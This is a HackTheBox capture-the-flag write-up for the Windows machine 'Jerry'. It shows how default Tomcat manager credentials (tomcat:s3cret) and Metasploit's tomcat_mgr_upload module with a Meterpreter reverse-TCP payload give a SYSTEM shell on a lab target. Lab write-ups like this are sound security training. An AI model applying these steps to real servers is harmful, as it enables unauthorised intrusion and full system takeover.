Jerry is an easy-difficulty Windows machine on
[HackTheBox](https://www.hackthebox.com/) showcasing how to exploit Apache
Tomcat to achieve remote code execution (RCE). Default credentials are used to
access Apache Tomcat's manager app, which can be used to upload a
malicious WAR archive that allows us to open a shell on the remote Windows
machine under the privileged user `NT AUTHORITY/SYSTEM`.

- OS: **Windows**
- Difficulty: **Easy**
- Services: **Apache Tomcat**
- Vulnerabilities: **Default Credentials**, **Arbitrary File Upload**, **Remote
  Code Execution**

## Reconnaissance

As with all machines, we start our reconnaissance with a simple port scan using
`nmap`.

`nmap` shows Apache Tomcat running on port 8080 and that the target is a Windows
machine. Navigating to `http://10.10.10.95:8080/`, we find the default homepage
for Apache Tomcat.

We see there is a button called "Manager App", which may lead us to an admin
portal of some kind.

## Accessing the Manager App

Upon trying to access the manager app, we're prompted for a username
and password. Default credentials like `admin:admin` and `admin:password` do not
work, and we are redirected to the below 403 page after an unsuccessful login.

On the 403 page, the credentials `tomcat:s3cret` are given as an example.
Unfortunately, we are no longer able to login via our current browser session
without clearing our browsing data. Instead, we can simply open the same page in
a private tab (`ctrl+shift+p` on Firefox).

Upon entering `tomcat:s3cret`, we gain access to the manager app.

The applications at the top of the page aren't of much interest, but scrolling
down we see an upload form for `.war` files.

## Uploading a Malicious Payload

Searching online for Apache Tomcat Manager upload exploits, we find this [Rapid7
exploit](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/).
Luckily, most of the exploits in Rapid7's database can easily be run via
Metasploit. We open Metasploit with the command `msfconsole` and select the
appropriate exploit, `exploit/multi/http/tomcat_mgr_upload`, as instructed on
the Rapid7 web page. We'll have to set several options for this exploit to work
properly with the command `set NAME VALUE`.

- `HttpPassword` -> `s3cret`
- `HttpUsername` -> `tomcat`
- `RHOSTS` -> `10.10.10.95`
- `RPORT` -> `8080`

Now that the module options are out of the way, we need to configure our payload
and target. Since we are targeting a Windows machine, we must set the target ID
appropriately. `show targets` indicates we should set the target ID to 1 (`set
target 1`). We also change the payload to `windows/meterpreter/reverse_tcp`
instead of the default `java/meterpreter/reverse_tcp`.

By default, your primary interface will be used as the value for `LHOST`, your
local machine. I am connecting to the box via OpenVPN, so I need to change this
to the address of my VPN interface (`set LHOST tun0`). When complete, your
options should look like what is shown below.

Upon typing `exploit`, everything runs successfully and we now have a shell on
the remote system!

Dropping into a Windows shell from Meterpreter, we run `whoami` and,
surprisingly, we are already running as `NT AUTHORITY/SYSTEM`, a default user
with administrator privileges.

## Flags

As usual, the appropriate flags are located in the Desktop directory of the
appropriate users. It seems in this case, both the user and root flags are
stored in `C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt`. Using
the `type` command, we are able to print their values.

# Conclusion

That concludes Jerry, a relatively simple machine with a straight forward path
to root. To summarize, we took advantage of several security flaws present in
this box:

- Exposed default homepage
- Default credentials
- Insecure file upload
- Service running as privileged user
